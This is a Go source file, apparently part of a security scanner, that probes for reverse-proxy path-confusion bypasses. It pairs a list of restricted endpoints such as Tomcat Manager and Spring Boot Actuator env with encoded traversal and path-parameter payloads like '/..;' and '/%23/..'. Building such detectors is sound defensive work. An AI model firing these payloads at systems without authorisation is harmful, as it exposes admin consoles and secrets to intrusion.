package reverse_proxy_path_confusion

import "strings"

// restrictedEndpoint is a high-value backend endpoint a reverse proxy is commonly
// configured to block, paired with content fingerprints that prove the *real*
// backend endpoint (not a catch-all 200) was reached.
type restrictedEndpoint struct {
	path string
	// label is a short human name for the endpoint, used in finding evidence.
	label string
	// fingerprints are lowercase substrings; at least one must appear in a 200
	// response body for it to count as "reached the real backend endpoint".
	fingerprints []string
}

// restrictedEndpoints is the curated target list. Kept small and
// fingerprint-backed: a bare 200 is never enough, so a generic catch-all that
// 200s every path cannot produce a finding.
var restrictedEndpoints = []restrictedEndpoint{
	{
		path:         "/manager/html",
		label:        "Tomcat Manager",
		fingerprints: []string{"tomcat web application manager", "manager application", "list applications"},
	},
	{
		path:         "/actuator",
		label:        "Spring Boot Actuator",
		fingerprints: []string{`"_links"`, `"health"`, `"self"`},
	},
	{
		path:         "/actuator/env",
		label:        "Spring Boot Actuator (env)",
		fingerprints: []string{"activeprofiles", "propertysources"},
	},
	{
		path:         "/server-status",
		label:        "Apache mod_status",
		fingerprints: []string{"apache server status", "server uptime", "scoreboard"},
	},
	{
		path:         "/nginx_status",
		label:        "Nginx stub_status",
		fingerprints: []string{"active connections", "server accepts handled requests"},
	},
	{
		path:         "/metrics",
		label:        "Prometheus metrics",
		fingerprints: []string{"# help", "# type", "process_cpu_seconds_total"},
	},
}

// confusionShell wraps a target path in a proxy-vs-backend path-parsing
// disagreement: the proxy routes (or blocks) on its reading of the path, the
// backend normalizes to a different path and serves it.
type confusionShell struct {
	label string
	// build wraps an absolute target path (e.g. "/manager/html") in the shell.
	build func(target string) string
}

// confusionShells are the routing/ACL path-confusion variants. These exercise
// fragment-truncation and path-parameter misrouting (the reverse-proxy
// contribution), deliberately distinct from nginx-off-by-slash's filesystem
// alias traversal. Literal "#" is avoided (the HTTP client would treat it as a
// fragment and not send it); the encoded "%23" form reaches the backend, which
// decodes and normalizes it.
var confusionShells = []confusionShell{
	{"encoded-fragment-truncation", func(t string) string { return "/%23/.." + t }},
	{"path-parameter-traversal", func(t string) string { return "/..;" + t }},
	{"dot-path-parameter", func(t string) string { return "/.;" + t }},
	{"encoded-slash-traversal", func(t string) string { return "/..%2f" + strings.TrimPrefix(t, "/") }},
	{"encoded-dotdot-param", func(t string) string { return "/%2e%2e;" + t }},
}

// decoyTarget is a path the backend will not recognize. The same confusion shell
// wrapped around it must NOT produce the endpoint fingerprint — that proves the
// fingerprint came from the real target path, not from the shell prefix.
const decoyTarget = "/vgolium-confusion-probe-404"
